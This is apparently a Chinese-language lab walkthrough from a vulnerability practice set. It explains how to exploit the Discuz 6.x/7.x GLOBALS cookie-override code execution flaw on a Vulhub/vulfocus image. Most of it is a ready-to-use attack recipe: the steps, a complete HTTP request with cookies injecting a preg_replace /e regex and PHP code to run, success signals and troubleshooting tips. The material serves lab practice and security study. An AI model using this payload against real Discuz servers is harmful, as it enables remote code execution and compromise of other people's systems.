# 125｜Discuz 6.x/7.x GLOBALS 覆盖代码执行（wooyun-2010-080723）

- 镜像：`vulfocus/discuz-wooyun_2010_080723:latest`（Hub：`admin`/`admin`）
- 题库端口：`80,3306`
- 题库编号：`wooyun-2010-080723`（无 CVE）

## 一句话打法

PHP 5.3 默认 `request_order=GP` 时，用 Cookie 覆盖 `$GLOBALS['_DCACHE']['smilies']`，让 `preg_replace` 的 `/e` 执行替换串。[S1][S2]

## 操作步骤

1. 打开论坛，找一条已存在的主题，记下 `viewthread.php?tid=`（Vulhub 示例 `tid=10`）。Hub 写后台 `admin`/`admin`，本链**不需要**登录。[S1][镜像说明]
2. 对该帖发送带 GLOBALS Cookie 的请求：[S1][S2]

   ```http
   GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
   Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
   ```

   `tid` 换成步骤 1 看到的真实帖子。成功信号：响应出现 `phpinfo()`。[S1][S2]

3. 触发点在 `include/discuzcode.func.php` 对 smilies 的 `preg_replace(..., /e)`。依赖 PHP 5.3.x 且 `$_REQUEST` 不含 Cookie，才能用 Cookie 打进 `$GLOBALS`。[S1][S2]

## 本题特有排坑

- Cookie 键必须是 **`GLOBALS[_DCACHE][smilies][...]`** 这种 PHP 数组名，不要改成 Discuz!ML 的 `language` Cookie（那是第124题）。[S1]
- `searcharray` 要用 `/.*/eui`（带 **e** 修饰符）；`replacearray` 是要执行的 PHP 代码。[S1][S2]
- 部分文章要求帖子带表情；Vulhub 实测不强制。若无帖子，需要先发/看到一个 `viewthread.php` 入口。[S1]
- 高版本 PHP 去掉 `preg_replace /e` 后这条链不成立；本题镜像按 Discuz 6/7 + PHP 5.3 环境来。[S1][S2]
